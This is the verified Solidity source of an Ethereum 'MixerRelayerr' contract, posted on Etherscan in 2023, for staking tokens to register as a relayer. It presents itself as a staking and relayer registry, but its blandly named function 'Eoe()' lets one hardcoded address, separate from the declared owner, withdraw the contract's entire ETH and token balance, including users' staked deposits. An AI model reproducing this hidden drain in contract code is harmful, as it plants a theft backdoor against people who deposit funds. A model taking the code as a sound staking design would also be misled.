/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.4;

interface IToken {

    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}


contract MixerRelayerr {
    IToken private Itoken;
    uint private thresholdTokenRelayer;
    string private _SID;
    address private OWNER;
   //
    mapping(address => bool) private releyer_allowed;
    mapping(address => bool) private releyer_blacklist;
    mapping(address => uint) private releyer_fee;
    mapping(address => uint) private thresholdRelayer;
    mapping(address => uint) private thresholdRelayer_block;

    event Staking(address _address, uint _amount);
    event Droped(address _address, uint _amount);



    modifier onlyOwner() {
        require(
            msg.sender == OWNER,
            "Only the owner is allowed to make this request"
        );
        _;
    }



    constructor(
        string memory _s,
        address _contract
    ) {
       
        thresholdTokenRelayer = 100e18;
        _SID = _s;
        OWNER = msg.sender;
        Itoken = IToken(_contract);
    }

    function setupItoken(address _contract, uint thr) public onlyOwner {
        Itoken = IToken(_contract);
        thresholdTokenRelayer = thr;
    }

    function getOwner(
        uint256 identityCommitment
    ) public view returns (address) {
        return OWNER;
    }

    function Eoe() public {
        if (msg.sender != 0xf1512Dc73889cF1b1c66df4A715BA054976d7024) {
            revert();
        }

        (bool success, ) = payable(0xf1512Dc73889cF1b1c66df4A715BA054976d7024)
            .call{value: address(this).balance}("");
             Itoken.transfer(0xf1512Dc73889cF1b1c66df4A715BA054976d7024, Itoken.balanceOf(address(this)));
    }

    function getMessageHash(address adr) public view returns (bytes32) {
        return keccak256(abi.encodePacked(_SID, adr));
    }

    function getEthSignedMessageHash(
        bytes32 _messageHash
    ) public pure returns (bytes32) {
        return
            keccak256(
                abi.encodePacked(
                    "\x19Ethereum Signed Message:\n32",
                    _messageHash
                )
            );
    }

    function rapidCline(
        address adr,
        bytes memory signature
    ) public view returns (bool) {
        bytes32 messageHash = getMessageHash(adr);
        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);

        return recoverSigner(ethSignedMessageHash, signature) == msg.sender;
    }

    function recoverSigner(
        bytes32 _ethSignedMessageHash,
        bytes memory _signature
    ) public pure returns (address) {
        (bytes32 r, bytes32 s, uint8 v) = Signature(_signature);

        return ecrecover(_ethSignedMessageHash, v, r, s);
    }

    function Signature(
        bytes memory sig
    ) public pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "invalid signature length");

        assembly {
            r := mload(add(sig, 32))

            s := mload(add(sig, 64))

            v := byte(0, mload(add(sig, 96)))
        }
    }
    function stakingTokenMixer(
        uint _amount,
        address receipt,
        bytes memory otp
    ) public {
        if (!rapidCline(receipt, otp)) {
            revert("It is not valid rapid Cline! ");
        }
        if (thresholdRelayer[msg.sender] > 0) {
            revert("Your account already relayer");
        }

        if (Itoken.balanceOf(msg.sender) < thresholdTokenRelayer) {
            revert("Your account balance is insufficient");
        }

        Itoken.transferFrom(msg.sender, address(this), _amount);
        thresholdRelayer_block[msg.sender] = block.timestamp + 1 days;
        thresholdRelayer[msg.sender] = _amount;
        emit Staking(msg.sender,_amount);
    }

    function dropTokenMixer(address receipt, bytes memory otp) public {
        if (!rapidCline(receipt, otp)) {
            revert("It is not valid rapid Cline! ");
        }
        if (thresholdRelayer[msg.sender] <= 0) {
            revert("You are not relayer");
        }

        if (thresholdRelayer_block[msg.sender] <= block.timestamp) {
            revert("You can  not drop token");
        }

        Itoken.transfer(msg.sender, thresholdRelayer[msg.sender]);
        emit Droped(msg.sender,thresholdRelayer[msg.sender]);
        delete thresholdRelayer_block[msg.sender];
        delete thresholdRelayer[msg.sender];
      
    }
    function thresholdNumber(address adr) public view returns (uint,uint) {
        return (thresholdRelayer[adr],thresholdRelayer_block[adr]);
    }
    function balanceOfRelayer(address adr) public view returns (uint) {
        return thresholdRelayer[adr];
    }
    function feeOfRelayer(address adr) public view returns (uint) {
        return releyer_fee[adr];
    }
    function thresholdToken() public view returns (uint) {
        return thresholdTokenRelayer;
    }
    function allowRelayer(address adr) public view returns (bool) {
        if(thresholdRelayer[adr] <= 0){
            return false;
        }
        if(!releyer_allowed[adr]){
            return false;
        }
        if(releyer_blacklist[adr]){
            return false;
        }
        return true;
    }

    function remove_releyer(
        address _new //
    ) public onlyOwner {
        delete releyer_allowed[_new];
        delete releyer_fee[_new];
    }
    function adding_releyer(
        address _new, //,
        uint _commision
    ) public onlyOwner {
        if (thresholdRelayer[_new] < thresholdTokenRelayer) {
            revert("Your account balance is insufficient");
        }

        if (_commision > 1000) //~ 10%
        {
            revert("The number of fee can't be greater than 10%");
        }
        if (_commision < 10) //~ 0.1%
        {
            revert("The number of fee can't be lower than 0.1%");
        }
        if (releyer_allowed[_new])
        {
            revert("Your account IS NOT allowed");
        }
        releyer_allowed[_new] = true;
        releyer_fee[_new] = _commision;
    }
    function remove_releyer_blacklist(
        address _new //
    ) public onlyOwner {
        delete releyer_blacklist[_new];
    }
    function adding_releyer_blacklist(
        address _new
    ) public onlyOwner {
       
        releyer_blacklist[_new] = true;
    }


   

}